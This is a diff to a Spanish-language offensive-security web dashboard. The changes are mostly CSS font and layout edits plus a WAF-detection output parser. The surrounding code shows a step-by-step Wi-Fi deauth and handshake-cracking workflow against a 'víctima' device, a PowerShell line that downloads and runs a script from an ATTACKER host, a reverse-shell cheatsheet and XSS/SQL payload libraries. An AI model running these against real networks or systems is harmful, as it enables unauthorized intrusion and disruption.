 .val-msg.ok{background:#040d05;border:1px solid #1a3a20;border-left-color:var(--g);color:var(--g)}
 
 /* ─── ADVANCED TOGGLE ────────────────────────────────── */
-.adv-toggle{font-size:7px;color:var(--dim);cursor:pointer;padding:4px 0;letter-spacing:2px;display:inline-flex;align-items:center;gap:5px;margin-bottom:5px;user-select:none}
+.adv-toggle{font-size:12px;color:var(--dim);cursor:pointer;padding:4px 0;letter-spacing:2px;display:inline-flex;align-items:center;gap:5px;margin-bottom:5px;user-select:none}
 .adv-toggle:hover{color:var(--g2)}
 .adv-toggle.open{color:var(--g)}
-.adv-arrow{transition:transform .2s;opacity:.6;font-size:8px}
+.adv-arrow{transition:transform .2s;opacity:.6;font-size:13px}
 .adv-toggle.open .adv-arrow{transform:rotate(90deg);opacity:1}
 .adv-section{display:none;border:1px dashed var(--brd);border-radius:3px;padding:8px;margin-bottom:8px;background:#020403}
 .adv-section.open{display:block}
 
 /* ─── PAYLOAD SEARCH ─────────────────────────────────── */
 .psearch{margin-bottom:8px;display:flex;gap:6px;align-items:center}
-.psearch input{flex:1;background:#040705;border:1px solid var(--brd);color:var(--txt);font-family:inherit;font-size:9px;padding:4px 7px;border-radius:4px;outline:none;transition:border .1s}
+.psearch input{flex:1;background:#040705;border:1px solid var(--brd);color:var(--txt);font-family:inherit;font-size:14px;padding:4px 7px;border-radius:4px;outline:none;transition:border .1s}
 .psearch input:focus{border-color:var(--g)}
-.psearch .pclear{font-size:9px;color:var(--dim);cursor:pointer;padding:2px 7px;border:1px solid var(--brd);border-radius:2px;flex-shrink:0}
+.psearch .pclear{font-size:14px;color:var(--dim);cursor:pointer;padding:2px 7px;border:1px solid var(--brd);border-radius:2px;flex-shrink:0}
 .psearch .pclear:hover{color:var(--g);border-color:var(--g)}
-.pcnt{font-size:7px;color:var(--mut);flex-shrink:0}
+.pcnt{font-size:12px;color:var(--mut);flex-shrink:0}
 .pitem.hidden{display:none!important}
 
 /* ─── ENCODER MODULE ─────────────────────────────────── */
 .enc-transforms{display:flex;flex-wrap:wrap;gap:4px;margin-bottom:8px}
-.enc-btn{background:#040705;border:1px solid var(--brd);border-radius:3px;padding:4px 9px;font-size:7px;color:var(--mut);cursor:pointer;font-family:inherit;letter-spacing:1px;transition:all .1s}
+.enc-btn{background:#040705;border:1px solid var(--brd);border-radius:3px;padding:4px 9px;font-size:12px;color:var(--mut);cursor:pointer;font-family:inherit;letter-spacing:1px;transition:all .1s}
 .enc-btn:hover{border-color:var(--g);color:var(--g2);background:#0a1a0c}
 .enc-btn:active{transform:scale(.97)}
-.enc-chain-wrap{background:#020403;border:1px solid var(--brd);border-radius:3px;padding:5px 8px;margin-bottom:6px;min-height:22px;font-size:8px;color:var(--cyan);word-break:break-all}
-.enc-chain-label{font-size:7px;color:var(--dim);letter-spacing:2px;margin-bottom:2px}
+.enc-chain-wrap{background:#020403;border:1px solid var(--brd);border-radius:3px;padding:5px 8px;margin-bottom:6px;min-height:22px;font-size:13px;color:var(--cyan);word-break:break-all}
+.enc-chain-label{font-size:12px;color:var(--dim);letter-spacing:2px;margin-bottom:2px}
 
 /* ─── METHOD BADGE ───────────────────────────────────── */
 .method-sel{display:flex;gap:4px;margin-bottom:8px;flex-wrap:wrap}
-.method-opt{font-size:7px;padding:3px 9px;border:1px solid var(--brd);border-radius:3px;cursor:pointer;color:var(--mut);transition:all .1s}
+.method-opt{font-size:12px;padding:3px 9px;border:1px solid var(--brd);border-radius:3px;cursor:pointer;color:var(--mut);transition:all .1s}
 .method-opt:hover{color:var(--g2);border-color:#2d6040}
 .method-opt.on{background:#0a1a0c;border-color:var(--g);color:var(--g)}
 
@@ -318,7 +318,7 @@ textarea.fi{resize:vertical;min-height:48px}
 .wl-combo{display:flex;flex-direction:column;gap:3px;width:100%}
 .wl-row{display:flex;gap:4px;align-items:center}
 .wl-row input.fi{flex:1}
-.wl-browse{background:#040a05;border:1px solid var(--brd);color:var(--g);font-size:10px;padding:3px 7px;border-radius:3px;cursor:pointer;white-space:nowrap;transition:all .1s;line-height:1}
+.wl-browse{background:#040a05;border:1px solid var(--brd);color:var(--g);font-size:14px;padding:3px 7px;border-radius:3px;cursor:pointer;white-space:nowrap;transition:all .1s;line-height:1}
 .wl-browse:hover{border-color:var(--g);background:#0a1a0c}
 
 /* ─── FILE BROWSER MODAL ─────────────────────────────── */
@@ -326,20 +326,78 @@ textarea.fi{resize:vertical;min-height:48px}
 #wl-modal.open{display:flex}
 #wl-modal-box{background:#050a06;border:1px solid var(--g);border-radius:4px;width:560px;max-width:95vw;max-height:80vh;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 0 40px rgba(0,255,136,.1),0 20px 60px rgba(0,0,0,.6)}
 #wl-modal-hdr{display:flex;align-items:center;gap:8px;padding:10px 14px;border-bottom:1px solid var(--brd);background:#040805}
-#wl-modal-hdr span{font-size:8px;letter-spacing:2px;color:var(--g);flex:1;text-transform:uppercase;text-shadow:0 0 8px rgba(0,255,136,.3)}
-#wl-modal-close{background:none;border:1px solid #3a1010;color:var(--red);font-size:11px;cursor:pointer;padding:2px 6px;border-radius:2px;transition:all .1s}
+#wl-modal-hdr span{font-size:13px;letter-spacing:2px;color:var(--g);flex:1;text-transform:uppercase;text-shadow:0 0 8px rgba(0,255,136,.3)}
+#wl-modal-close{background:none;border:1px solid #3a1010;color:var(--red);font-size:15px;cursor:pointer;padding:2px 6px;border-radius:2px;transition:all .1s}
 #wl-modal-close:hover{background:#200808}
-#wl-modal-path{font-size:8px;color:var(--cyan);padding:6px 14px;border-bottom:1px solid var(--brd);background:#030605;word-break:break-all;letter-spacing:.5px}
+#wl-modal-path{font-size:13px;color:var(--cyan);padding:6px 14px;border-bottom:1px solid var(--brd);background:#030605;word-break:break-all;letter-spacing:.5px}
 #wl-modal-list{flex:1;overflow-y:auto;padding:4px 0}
-.wl-entry{display:flex;align-items:center;gap:8px;padding:6px 14px;font-size:9px;cursor:pointer;transition:background .08s;color:var(--txt);border-left:2px solid transparent}
+.wl-entry{display:flex;align-items:center;gap:8px;padding:6px 14px;font-size:14px;cursor:pointer;transition:background .08s;color:var(--txt);border-left:2px solid transparent}
 .wl-entry:hover{background:#080f09;border-left-color:#1a3a20}
 .wl-entry.is-dir{color:var(--cyan)}
 .wl-entry.is-dir:hover{border-left-color:var(--cyan)}
-.wl-entry .wl-icon{font-size:10px;width:14px;text-align:center;flex-shrink:0}
-.wl-entry .wl-size{margin-left:auto;font-size:7px;color:var(--dim)}
-#wl-modal-filter{background:#030604;border:0;border-top:1px solid var(--brd);padding:7px 14px;color:var(--txt);font-family:inherit;font-size:9px;outline:none;width:100%}
+.wl-entry .wl-icon{font-size:14px;width:14px;text-align:center;flex-shrink:0}
+.wl-entry .wl-size{margin-left:auto;font-size:12px;color:var(--dim)}
+#wl-modal-filter{background:#030604;border:0;border-top:1px solid var(--brd);padding:7px 14px;color:var(--txt);font-family:inherit;font-size:14px;outline:none;width:100%}
 #wl-modal-filter:focus{background:#040805}
 #wl-modal-filter::placeholder{color:var(--dim)}
+
+/* ─── RESPONSIVE / ADAPTIVE LAYOUT ──────────────────── */
+
+/* Fluid output heights */
+.out-content{max-height:clamp(120px,20vh,260px)}
+.out-parsed{max-height:clamp(160px,26vh,340px)}
+
+/* ── 4K / XL ≥1800px: scale panels up ─────────────── */
+@media(min-width:1800px){
+  #sidebar{width:260px}
+  #term-panel:not(.collapsed){width:420px}
+  #enc-aux-panel.active{width:580px}
+  .panel.active{grid-template-columns:1fr 490px}
+}
+
+/* ── 1400–1799px (standard 1080p): default sizes apply ── */
+/* sidebar:215px / terminal:365px / grid:1fr 415px */
+
+/* ── 1200–1399px: compress right panels slightly ──────── */
+@media(max-width:1399px){
+  #term-panel:not(.collapsed){width:320px}
+  #enc-aux-panel.active{width:420px}
+  .panel.active{grid-template-columns:1fr 370px}
+}
+
+/* ── 1024–1199px: small laptop ────────────────────────── */
+@media(max-width:1199px){
+  #sidebar{width:192px}
+  #term-panel:not(.collapsed){width:280px}
+  #enc-aux-panel.active{width:340px}
+  .panel.active{grid-template-columns:1fr 320px}
+}
+
+/* ── <1024px: hide terminal, go wider ─────────────────── */
+@media(max-width:1023px){
+  #term-panel{display:none}
+  #enc-aux-panel.active{width:clamp(260px,40vw,380px)}
+  .panel.active{grid-template-columns:1fr 330px}
+}
+
+/* ── <820px: single-column panel ──────────────────────── */
+@media(max-width:819px){
+  #sidebar{width:172px}
+  .panel.active{grid-template-columns:1fr}
+  .panel.active .cmd-preview,
+  .panel.active .run-row,
+  .panel.active .out-area{grid-column:1}
+}
+
+/* ── ≤680px: vertical stack ───────────────────────────── */
+@media(max-width:680px){
+  body{overflow:auto}
+  #layout,#body{flex-direction:column}
+  #sidebar{width:100%;border-right:none;border-bottom:1px solid var(--brd);padding-bottom:4px}
+  .acc-items.open{max-height:none}
+  #content{padding:12px 14px}
+  #enc-aux-panel.active{width:100%}
+}
 </style>
 </head>
 <body>
@@ -1590,42 +1648,42 @@ textarea.fi{resize:vertical;min-height:48px}
   </div>
   <div style="display:flex;flex-direction:column;gap:5px">
     <div style="background:#020403;border:1px solid var(--brd);border-radius:4px;padding:7px 10px">
-      <div style="font-size:7px;color:var(--g);margin-bottom:3px;letter-spacing:1px">1 — Monitor mode</div>
+      <div style="font-size:12px;color:var(--g);margin-bottom:3px;letter-spacing:1px">1 — Monitor mode</div>
       <div class="cmd-text" id="ac-1"></div>
       <div style="display:flex;gap:5px;margin-top:4px">
-        <button class="rbtn" style="padding:3px 9px;font-size:7px" onclick="execDirect(getCmdText('ac-1'))">▶ RUN</button>
+        <button class="rbtn" style="padding:3px 9px;font-size:12px" onclick="execDirect(getCmdText('ac-1'))">▶ RUN</button>
         <button class="kbtn" onclick="cpCmd('ac-1')">COPY</button>
       </div>
     </div>
     <div style="background:#020403;border:1px solid var(--brd);border-radius:4px;padding:7px 10px">
-      <div style="font-size:7px;color:var(--g);margin-bottom:3px;letter-spacing:1px">2 — Scan networks</div>
+      <div style="font-size:12px;color:var(--g);margin-bottom:3px;letter-spacing:1px">2 — Scan networks</div>
       <div class="cmd-text" id="ac-5"></div>
       <div style="display:flex;gap:5px;margin-top:4px">
-        <button class="rbtn" style="padding:3px 9px;font-size:7px" onclick="execDirect(getCmdText('ac-5'))">▶ RUN</button>
+        <button class="rbtn" style="padding:3px 9px;font-size:12px" onclick="execDirect(getCmdText('ac-5'))">▶ RUN</button>
         <button class="kbtn" onclick="cpCmd('ac-5')">COPY</button>
       </div>
     </div>
     <div style="background:#020403;border:1px solid var(--brd);border-radius:4px;padding:7px 10px">
-      <div style="font-size:7px;color:var(--g);margin-bottom:3px;letter-spacing:1px">3 — Capture handshake</div>
+      <div style="font-size:12px;color:var(--g);margin-bottom:3px;letter-spacing:1px">3 — Capture handshake</div>
       <div class="cmd-text" id="ac-2"></div>
       <div style="display:flex;gap:5px;margin-top:4px">
-        <button class="rbtn" style="padding:3px 9px;font-size:7px" onclick="execDirect(getCmdText('ac-2'))">▶ RUN</button>
+        <button class="rbtn" style="padding:3px 9px;font-size:12px" onclick="execDirect(getCmdText('ac-2'))">▶ RUN</button>
         <button class="kbtn" onclick="cpCmd('ac-2')">COPY</button>
       </div>
     </div>
     <div style="background:#020403;border:1px solid var(--brd);border-radius:4px;padding:7px 10px">
-      <div style="font-size:7px;color:var(--g);margin-bottom:3px;letter-spacing:1px">4 — Deauth</div>
+      <div style="font-size:12px;color:var(--g);margin-bottom:3px;letter-spacing:1px">4 — Deauth</div>
       <div class="cmd-text" id="ac-3"></div>
       <div style="display:flex;gap:5px;margin-top:4px">
-        <button class="rbtn" style="padding:3px 9px;font-size:7px" onclick="execDirect(getCmdText('ac-3'))">▶ RUN</button>
+        <button class="rbtn" style="padding:3px 9px;font-size:12px" onclick="execDirect(getCmdText('ac-3'))">▶ RUN</button>
         <button class="kbtn" onclick="cpCmd('ac-3')">COPY</button>
       </div>
     </div>
     <div style="background:#020403;border:1px solid var(--brd);border-radius:4px;padding:7px 10px">
-      <div style="font-size:7px;color:var(--g);margin-bottom:3px;letter-spacing:1px">5 — Crack</div>
+      <div style="font-size:12px;color:var(--g);margin-bottom:3px;letter-spacing:1px">5 — Crack</div>
       <div class="cmd-text" id="ac-4"></div>
       <div style="display:flex;gap:5px;margin-top:4px">
-        <button class="rbtn" style="padding:3px 9px;font-size:7px" onclick="execDirect(getCmdText('ac-4'))">▶ RUN</button>
+        <button class="rbtn" style="padding:3px 9px;font-size:12px" onclick="execDirect(getCmdText('ac-4'))">▶ RUN</button>
         <button class="kbtn" onclick="cpCmd('ac-4')">COPY</button>
       </div>
     </div>
@@ -1648,7 +1706,7 @@ textarea.fi{resize:vertical;min-height:48px}
       <input class="fi" id="wd-mon" placeholder="wlan0mon" oninput="bWd()">
     </div>
     <div class="ig">
-      <div class="lbl">BSSID <span style="color:var(--dim);font-size:6px">← click en tabla</span></div>
+      <div class="lbl">BSSID <span style="color:var(--dim);font-size:11px">← click en tabla</span></div>
       <input class="fi" id="wd-bs" placeholder="AA:BB:CC:DD:EE:FF" oninput="bWd()">
     </div>
     <div class="ig" style="max-width:52px">
@@ -1656,7 +1714,7 @@ textarea.fi{resize:vertical;min-height:48px}
       <input class="fi" id="wd-ch" placeholder="6" oninput="bWd()">
     </div>
     <div class="ig">
-      <div class="lbl">STATION <span style="color:var(--dim);font-size:6px">← click en tabla</span></div>
+      <div class="lbl">STATION <span style="color:var(--dim);font-size:11px">← click en tabla</span></div>
       <input class="fi" id="wd-st" placeholder="BB:CC:DD:EE:FF:00" oninput="bWd()">
     </div>
     <div class="ig" style="max-width:80px">
@@ -1672,56 +1730,56 @@ textarea.fi{resize:vertical;min-height:48px}
   <!-- LIVE PANEL -->
   <div id="wd-live" style="background:#020504;border:1px solid var(--brd);border-radius:4px;padding:8px 10px;margin-top:7px">
     <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:5px">
-      <span style="font-size:7px;color:var(--g);letter-spacing:2px">VISTA EN VIVO</span>
-      <button class="kbtn" style="font-size:6px;padding:1px 7px" onclick="wdClearState()">LIMPIAR</button>
+      <span style="font-size:12px;color:var(--g);letter-spacing:2px">VISTA EN VIVO</span>
+      <button class="kbtn" style="font-size:11px;padding:1px 7px" onclick="wdClearState()">LIMPIAR</button>
     </div>
-    <div id="wd-live-content" style="font-size:8px;color:var(--dim);font-style:italic;padding:8px 0;text-align:center">
+    <div id="wd-live-content" style="font-size:13px;color:var(--dim);font-style:italic;padding:8px 0;text-align:center">
       Pon la interfaz arriba y ejecuta PASO 1
     </div>
-    <div id="wd-deauth-status" style="display:none;margin-top:6px;padding:6px 9px;border-radius:3px;border:1px solid #3a1010;background:#070101;font-size:8px;font-family:'JetBrains Mono',monospace"></div>
+    <div id="wd-deauth-status" style="display:none;margin-top:6px;padding:6px 9px;border-radius:3px;border:1px solid #3a1010;background:#070101;font-size:13px;font-family:'JetBrains Mono',monospace"></div>
   </div>
 
   <!-- STEPS -->
   <div style="display:flex;flex-direction:column;gap:5px;margin-top:6px">
 
     <div id="wd-card-1" style="background:#020403;border:1px solid var(--brd);border-radius:4px;padding:7px 10px">
-      <div style="font-size:7px;color:var(--g);margin-bottom:2px;letter-spacing:1px">PASO 1 — Activar modo monitor</div>
-      <div style="font-size:7px;color:var(--mut);margin-bottom:4px">Ejecuta una vez y termina solo. La interfaz quedará como <span style="color:var(--cyan)" id="wd-mon-hint">wlan0mon</span>.</div>
+      <div style="font-size:12px;color:var(--g);margin-bottom:2px;letter-spacing:1px">PASO 1 — Activar modo monitor</div>
+      <div style="font-size:12px;color:var(--mut);margin-bottom:4px">Ejecuta una vez y termina solo. La interfaz quedará como <span style="color:var(--cyan)" id="wd-mon-hint">wlan0mon</span>.</div>
       <div class="cmd-text" id="wd-1"></div>
       <div style="display:flex;gap:5px;margin-top:4px">
-        <button class="rbtn" style="padding:3px 9px;font-size:7px" onclick="wdRun(1,this)">▶ RUN</button>
+        <button class="rbtn" style="padding:3px 9px;font-size:12px" onclick="wdRun(1,this)">▶ RUN</button>
         <button class="kbtn" onclick="cpCmd('wd-1')">COPY</button>
       </div>
     </div>
 
     <div id="wd-card-2" style="background:#020403;border:1px solid var(--brd);border-radius:4px;padding:7px 10px;opacity:.5;pointer-events:none">
-      <div style="font-size:7px;color:var(--g);margin-bottom:2px;letter-spacing:1px">PASO 2 — Escanear todas las redes</div>
-      <div style="font-size:7px;color:var(--mut);margin-bottom:4px">Las redes llenan la tabla arriba. <b style="color:var(--cyan)">Click en fila</b> → rellena BSSID+CH. Luego STOP.</div>
+      <div style="font-size:12px;color:var(--g);margin-bottom:2px;letter-spacing:1px">PASO 2 — Escanear todas las redes</div>
+      <div style="font-size:12px;color:var(--mut);margin-bottom:4px">Las redes llenan la tabla arriba. <b style="color:var(--cyan)">Click en fila</b> → rellena BSSID+CH. Luego STOP.</div>
       <div class="cmd-text" id="wd-2"></div>
       <div style="display:flex;gap:5px;margin-top:4px">
-        <button class="rbtn" style="padding:3px 9px;font-size:7px" onclick="wdRun(2,this)">▶ RUN</button>
+        <button class="rbtn" style="padding:3px 9px;font-size:12px" onclick="wdRun(2,this)">▶ RUN</button>
         <button class="sbtn wd-sbtn" onclick="wdStop()" disabled>■ STOP</button>
         <button class="kbtn" onclick="cpCmd('wd-2')">COPY</button>
       </div>
     </div>
 
     <div id="wd-card-3" style="background:#020403;border:1px solid var(--brd);border-radius:4px;padding:7px 10px;opacity:.5;pointer-events:none">
-      <div style="font-size:7px;color:var(--g);margin-bottom:2px;letter-spacing:1px">PASO 3 — Ver dispositivos conectados</div>
-      <div style="font-size:7px;color:var(--mut);margin-bottom:4px">Enfoca la red objetivo. <b style="color:var(--yellow)">Click en fila STATION</b> → rellena víctima. Luego STOP.</div>
+      <div style="font-size:12px;color:var(--g);margin-bottom:2px;letter-spacing:1px">PASO 3 — Ver dispositivos conectados</div>
+      <div style="font-size:12px;color:var(--mut);margin-bottom:4px">Enfoca la red objetivo. <b style="color:var(--yellow)">Click en fila STATION</b> → rellena víctima. Luego STOP.</div>
       <div class="cmd-text" id="wd-3"></div>
       <div style="display:flex;gap:5px;margin-top:4px">
-        <button class="rbtn" style="padding:3px 9px;font-size:7px" onclick="wdRun(3,this)">▶ RUN</button>
+        <button class="rbtn" style="padding:3px 9px;font-size:12px" onclick="wdRun(3,this)">▶ RUN</button>
         <button class="sbtn wd-sbtn" onclick="wdStop()" disabled>■ STOP</button>
         <button class="kbtn" onclick="cpCmd('wd-3')">COPY</button>
       </div>
     </div>
 
     <div id="wd-card-4" style="background:#020403;border:1px solid #3a1010;border-radius:4px;padding:7px 10px;opacity:.5;pointer-events:none">
-      <div style="font-size:7px;color:var(--red);margin-bottom:2px;letter-spacing:1px">PASO 4 — DEAUTH ATTACK</div>
-      <div style="font-size:7px;color:var(--mut);margin-bottom:4px">Envía paquetes de desconexión continuos. Pulsa STOP cuando quieras terminar.</div>
+      <div style="font-size:12px;color:var(--red);margin-bottom:2px;letter-spacing:1px">PASO 4 — DEAUTH ATTACK</div>
+      <div style="font-size:12px;color:var(--mut);margin-bottom:4px">Envía paquetes de desconexión continuos. Pulsa STOP cuando quieras terminar.</div>
       <div class="cmd-text" id="wd-4"></div>
       <div style="display:flex;gap:5px;margin-top:4px">
-        <button class="rbtn" style="padding:3px 9px;font-size:7px;background:#1a0505;border-color:var(--red);color:var(--red)" onclick="wdRun(4,this)">▶ ATTACK</button>
+        <button class="rbtn" style="padding:3px 9px;font-size:12px;background:#1a0505;border-color:var(--red);color:var(--red)" onclick="wdRun(4,this)">▶ ATTACK</button>
         <button class="sbtn wd-sbtn" style="border-color:var(--red);color:var(--red)" onclick="wdStop()" disabled>■ STOP</button>
         <button class="kbtn" onclick="cpCmd('wd-4')">COPY</button>
       </div>
@@ -1834,7 +1892,7 @@ textarea.fi{resize:vertical;min-height:48px}
     <div class="pitem"><span class="ptxt">powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-PrivescCheck.ps1'); Invoke-PrivescCheck"</span><span class="pcopy" onclick="ctxt(this)">COPY</span></div>
   </div>
   <div id="lp-serve" class="tab-content">
-    <div style="font-size:8px;color:var(--mut);margin-bottom:8px">Servidor HTTP en Kali para servir archivos a la víctima</div>
+    <div style="font-size:13px;color:var(--mut);margin-bottom:8px">Servidor HTTP en Kali para servir archivos a la víctima</div>
     <div class="row">
       <div class="ig" style="max-width:75px"><div class="lbl">PUERTO</div><input class="fi" id="srv-port" value="8080"></div>
       <div class="ig"><div class="lbl">DIRECTORIO</div><input class="fi" id="srv-dir" value="/root/tools"></div>
@@ -1848,7 +1906,7 @@ textarea.fi{resize:vertical;min-height:48px}
 <!-- ══ REV SHELLS ══ -->
 <div id="p-revshells" class="panel">
   <div class="pt">REV SHELLS <span class="ptd">— Reverse shell cheatsheet</span></div>
-  <div style="font-size:8px;color:var(--mut);margin-bottom:8px;padding:5px 8px;background:#020403;border:1px solid var(--brd);border-radius:3px">
+  <div style="font-size:13px;color:var(--mut);margin-bottom:8px;padding:5px 8px;background:#020403;border:1px solid var(--brd);border-radius:3px">
     Reemplaza <span style="color:var(--cyan)">ATTACKER</span> con tu IP y <span style="color:var(--cyan)">PORT</span> con tu puerto (default 4444)
   </div>
   <div class="tabs">
@@ -1940,7 +1998,7 @@ textarea.fi{resize:vertical;min-height:48px}
       <button class="del-btn" onclick="delHeader(this)">✕</button>
     </div>
   </div>
-  <button class="kbtn" onclick="addHeader()" style="margin-bottom:9px;font-size:7px">+ ADD HEADER</button>
+  <button class="kbtn" onclick="addHeader()" style="margin-bottom:9px;font-size:12px">+ ADD HEADER</button>
 
   <!-- BODY -->
   <div id="cu-body-row">
@@ -1990,7 +2048,7 @@ textarea.fi{resize:vertical;min-height:48px}
   <div class="out-area" id="cu-out" style="margin-top:9px">
     <div class="out-hdr">
       <span class="out-title">RESPUESTA</span>
-      <span id="cu-status" style="font-size:9px;font-weight:700;margin-right:8px"></span>
+      <span id="cu-status" style="font-size:14px;font-weight:700;margin-right:8px"></span>
       <button class="kbtn" onclick="clrOut('cu-out')">CLEAR</button>
     </div>
     <div class="out-content" id="cu-out-c"></div>
@@ -2131,20 +2189,20 @@ textarea.fi{resize:vertical;min-height:48px}
     <button class="kbtn" onclick="execAndCopy2('apt install -y nmap gobuster ffuf nikto wpscan hydra john hashcat sqlmap medusa wfuzz')">INSTALAR BÁSICAS</button>
     <button class="kbtn" onclick="execAndCopy2('apt install -y crackmapexec smbmap responder bloodhound neo4j aircrack-ng tcpdump')">INSTALAR AD/WIRELESS</button>
   </div>
-  <div class="tool-grid" id="tools-grid"><div style="color:var(--mut);font-size:9px">Click "Verificar Todo" para revisar herramientas instaladas.</div></div>
+  <div class="tool-grid" id="tools-grid"><div style="color:var(--mut);font-size:14px">Click "Verificar Todo" para revisar herramientas instaladas.</div></div>
 </div>
 
 <!-- ══ FILES ══ -->
 <div id="p-files" class="panel">
   <div class="pt">ARCHIVOS <span class="ptd">— /tmp, /root</span></div>
   <div class="run-row" style="margin-bottom:10px"><button class="rbtn" onclick="loadFiles()">▶ LISTAR</button></div>
-  <div id="files-content" style="font-size:9px;color:var(--mut)">Click para listar archivos.</div>
+  <div id="files-content" style="font-size:14px;color:var(--mut)">Click para listar archivos.</div>
 </div>
 
 <!-- ══ HISTORY ══ -->
 <div id="p-history" class="panel">
   <div class="pt">HISTORIAL <span class="ptd">— Comandos de esta sesión</span></div>
-  <div id="hist-list" class="plist"><div style="color:var(--dim);font-size:9px;padding:14px 0;text-align:center">— vacío —</div></div>
+  <div id="hist-list" class="plist"><div style="color:var(--dim);font-size:14px;padding:14px 0;text-align:center">— vacío —</div></div>
   <button class="kbtn" onclick="clearHist()" style="margin-top:10px;border-color:var(--red);color:var(--red)">LIMPIAR</button>
 </div>
 
@@ -2154,7 +2212,7 @@ textarea.fi{resize:vertical;min-height:48px}
 
   <!-- ── ENCODER TOOL ── -->
   <div id="enc-tool">
-    <div style="font-size:8px;color:var(--mut);margin-bottom:8px">Transforma texto manualmente. Las transformaciones se encadenan. Usa los botones ENC en XSS/SQL Payloads para cargar aquí directamente.</div>
+    <div style="font-size:13px;color:var(--mut);margin-bottom:8px">Transforma texto manualmente. Las transformaciones se encadenan. Usa los botones ENC en XSS/SQL Payloads para cargar aquí directamente.</div>
     <div class="ig" style="margin-bottom:8px">
       <div class="lbl">INPUT</div>
       <textarea class="fi" id="enc-in" rows="4" placeholder="Pega aquí el texto o payload a transformar..." oninput="encUpdate()" style="min-height:70px"></textarea>
@@ -2245,7 +2303,7 @@ textarea.fi{resize:vertical;min-height:48px}
 <div id="enc-aux-panel">
   <div id="enc-aux-topbar">
     <div id="enc-aux-title">BIBLIOTECA / OFUSC</div>
-    <div style="font-size:7px;color:var(--mut);letter-spacing:1px">Click <span style="color:var(--cyan)">ENC</span> para cargar en el editor</div>
+    <div style="font-size:12px;color:var(--mut);letter-spacing:1px">Click <span style="color:var(--cyan)">ENC</span> para cargar en el editor</div>
   </div>
   <div id="enc-aux-tabs">
     <div class="elib-tab on" onclick="stabLib('xss',this)">XSS</div>
@@ -2665,13 +2723,13 @@ function addHist(cmd) {
   if (hist.length > 100) hist.pop();
   document.getElementById('sb-hist').textContent = hist.length + ' cmds';
   document.getElementById('hist-list').innerHTML = hist.map(h =>
-    `<div class="pitem"><span class="ptxt">${h.cmd.trim()}</span><span style="font-size:7px;color:var(--mut);white-space:nowrap">${h.ts}</span></div>`
+    `<div class="pitem"><span class="ptxt">${h.cmd.trim()}</span><span style="font-size:12px;color:var(--mut);white-space:nowrap">${h.ts}</span></div>`
   ).join('');
 }
 function clearHist() {
   hist.length = 0;
   document.getElementById('sb-hist').textContent = '0 cmds';
-  document.getElementById('hist-list').innerHTML = '<div style="color:var(--dim);font-size:9px;padding:14px 0;text-align:center">— vacío —</div>';
+  document.getElementById('hist-list').innerHTML = '<div style="color:var(--dim);font-size:14px;padding:14px 0;text-align:center">— vacío —</div>';
 }
 
 /* ─── JOB COUNT ───────────────────────────────────────── */
@@ -2847,13 +2905,71 @@ parsers.th = r => {
   return o;
 };
 
-/* WHATWEB */
+/* WHATWEB / WAFW00F — dispatch by output signature */
 parsers.ww = r => {
+  // wafw00f output always contains "Number of requests:" or "No WAF detected"
+  if (/Number of requests:|No WAF detected|\[\*\] Checking /i.test(r)) return parsers._waf(r);
+  return parsers._whatweb(r);
+};
+
+/* WHATWEB */
+parsers._whatweb = r => {
   const techs=[];
   for (const l of r.split('\n')){const ms=[...l.matchAll(/([\w][\w.-]{1,})\[([^\]]{0,80})\]/g)];for(const m of ms){if(!['Status','IP','Country'].includes(m[1]))techs.push([ph.esc(m[1]),ph.esc(m[2])]);}};
   const uniq=[...new Map(techs.map(t=>[t[0],t])).values()];
   let o=ph.sum([ph.pill(uniq.length+' tecnologías','info')]);
   o+=uniq.length?ph.sec('Tecnologías',ph.tbl(['TECH','INFO'],uniq)):ph.empty('Sin tecnologías reconocidas.');
+  return o;
+};
+
+/* WAFW00F */
+parsers._waf = r => {
+  // Extract target
+  const targetM = r.match(/\[\*\] Checking (.+?)(?:\s*\.\.\.)?$/m);
+  const target = targetM ? targetM[1].trim() : '—';
+
+  // Extract all detected WAFs: "[+] The site X is behind NAME (VENDOR) WAF."
+  const wafMatches = [...r.matchAll(/\[\+\] The site .+? is behind (.+?) \((.+?)\) WAF/gi)];
+
+  // No WAF line
+  const noWaf = /No WAF detected/i.test(r);
+
+  // Requests count
+  const reqM = r.match(/Number of requests:\s*(\d+)/i);
+  const requests = reqM ? reqM[1] : '—';
+
+  const detected = wafMatches.length > 0;
+  const statusPill = detected
+    ? ph.pill('WAF detectado','crit')
+    : ph.pill('No WAF detectado','ok');
+
+  let o = ph.sum([
+    ph.pill(ph.esc(target.slice(0,60)),'info'),
+    statusPill,
+    requests !== '—' ? ph.pill('Requests: '+requests,'info') : '',
+  ]);
+
+  if (detected) {
+    const rows = wafMatches.map(m => [ph.esc(m[1]), ph.esc(m[2])]);
+    o += ph.sec('WAF / Protección detectada', ph.tbl(['Technology / Product','Vendor'], rows));
+    if (wafMatches.length === 1) {
+      // single-row detail view as finds for better readability
+      o += ph.sec('Detalle', [
+        ph.find('<span style="color:var(--mut);letter-spacing:1px">TARGET</span>  '+ph.esc(target), 'info'),
+        ph.find('<span style="color:var(--mut);letter-spacing:1px">TECHNOLOGY</span>  '+ph.esc(wafMatches[0][1]), 'crit'),
+        ph.find('<span style="color:var(--mut);letter-spacing:1px">VENDOR</span>  '+ph.esc(wafMatches[0][2]), 'warn'),
+        ph.find('<span style="color:var(--mut);letter-spacing:1px">REQUESTS</span>  '+requests, 'info'),
+      ].join(''));
+    }
+  } else {
+    o += ph.sec('Resultado', ph.find(
+      noWaf
+        ? 'Sin WAF detectado por las firmas disponibles. El objetivo puede estar sin protección o usar un WAF desconocido.'
+        : 'No se pudo determinar la presencia de WAF.',
+      'ok'
+    ));
+  }
+
   return o;
 };
 
@@ -3598,9 +3714,9 @@ function _wdDraw(){
   if(!aps.length&&!stations.length)return;
   let h='';
   if(aps.length){
-    h+=`<div style="font-size:7px;color:var(--g);letter-spacing:1px;margin-bottom:4px">${aps.length} REDES — <span style="color:var(--cyan)">click fila → BSSID+CH</span></div>`;
-    h+='<table style="width:100%;border-collapse:collapse;font-size:8px;font-family:\'JetBrains Mono\',monospace">';
-    h+='<tr style="color:var(--mut);font-size:7px"><td style="padding:2px 5px">BSSID</td><td style="padding:2px 5px">ESSID</td><td style="padding:2px 5px">CH</td><td style="padding:2px 5px">PWR</td><td style="padding:2px 5px">ENC</td></tr>';
